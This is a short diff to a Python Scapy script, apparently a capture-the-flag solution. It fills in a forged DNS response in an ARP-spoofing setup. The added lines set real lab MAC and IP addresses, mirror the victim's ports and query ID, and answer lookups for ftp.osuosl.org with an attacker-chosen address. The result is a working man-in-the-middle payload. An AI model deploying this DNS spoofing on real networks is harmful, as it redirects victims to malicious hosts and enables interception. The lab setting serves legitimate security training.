@@ -456,16 +456,20 @@ ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
 # Our Mac Addr
 macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
 # destination ip we arp spoofed
-ipaddr_we_arp_spoofed = "10.6.1.10"
+ipaddr_we_arp_spoofed = "10.6.6.53"
 
 def handle_dns_request(packet):
     # Need to change mac addresses, Ip Addresses, and ports below.
     # We also need
-    eth = Ether(src="00:00:00:00:00:00", dst="00:00:00:00:00:00")   # need to replace mac addresses
-    ip  = IP(dst="0.0.0.0", src="0.0.0.0")                          # need to replace IP addresses
-    udp = UDP(dport=99999, sport=99999)                             # need to replace ports
+    eth = Ether(src="02:42:0a:06:00:02", dst="4c:24:57:ab:ed:84")   # need to replace mac addresses
+    ip  = IP(dst="10.6.6.35", src="10.6.6.53")                          # need to replace IP addresses
+    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)                             # need to replace ports
     dns = DNS(
-        # MISSING DNS RESPONSE LAYER VALUES 
+        id=packet[DNS].id,
+        qd=packet[DNS].qd,
+        aa=1,
+        qr=1,
+        an=DNSRR(rrname="ftp.osuosl.org", ttl=10, rdata="10.6.0.2")
     )
     dns_response = eth / ip / udp / dns
     sendp(dns_response, iface="eth0")
